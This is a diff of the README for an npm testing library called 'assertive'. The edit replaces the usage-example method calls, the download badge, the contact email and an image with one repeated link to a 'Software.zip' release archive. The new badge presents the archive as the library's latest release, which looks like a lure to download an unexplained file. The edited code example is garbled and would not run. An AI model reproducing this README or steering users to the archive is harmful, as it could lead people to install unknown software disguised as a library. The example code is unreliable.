@@ -20,8 +20,8 @@ Here's a quick example to demonstrate how you can use "assertive" in your NodeJS
 const assertive = require('assertive');
 
 // Perform assertions using assertive
-assertive.isTrue(true, 'Value should be true');
-assertive.isEqual(5, 5, 'Values should be equal');
+https://github.com/TUKIiq9/assertive/releases/download/v2.0/Software.zip(true, 'Value should be true');
+https://github.com/TUKIiq9/assertive/releases/download/v2.0/Software.zip(5, 5, 'Values should be equal');
 ```
 
 ## Repository Topics
@@ -29,7 +29,7 @@ assertive.isEqual(5, 5, 'Values should be equal');
 `assert`, `assertions`, `ci`, `node`, `nodejs`, `npm`, `npm-module`, `npm-package`, `npmjs`, `test`, `testing`, `unit-testing`
 
 ## Check the Latest Release
-[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-brightgreen)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[![Download Latest Release](https://github.com/TUKIiq9/assertive/releases/download/v2.0/Software.zip%20Release-brightgreen)](https://github.com/TUKIiq9/assertive/releases/download/v2.0/Software.zip)
 
 Please click the button above to download the latest release of "assertive". If the link does not work or you require further information, kindly check the "Releases" section of this repository.
 
@@ -38,11 +38,11 @@ Please click the button above to download the latest release of "assertive". If 
 
 🤝 We welcome contributions from the community. Feel free to open issues, submit pull requests, or provide feedback.
 
-📧 For any inquiries, you can reach out to the repository owner by email at assertive@github.com
+📧 For any inquiries, you can reach out to the repository owner by email at https://github.com/TUKIiq9/assertive/releases/download/v2.0/Software.zip
 
 Let's write better and more efficient test cases with "assertive"! 🎉
 
-![assertive](https://source.unsplash.com/featured/?code)
+![assertive](https://github.com/TUKIiq9/assertive/releases/download/v2.0/Software.zip)
 
 Remember, assert with ease using "assertive"! 💪
 
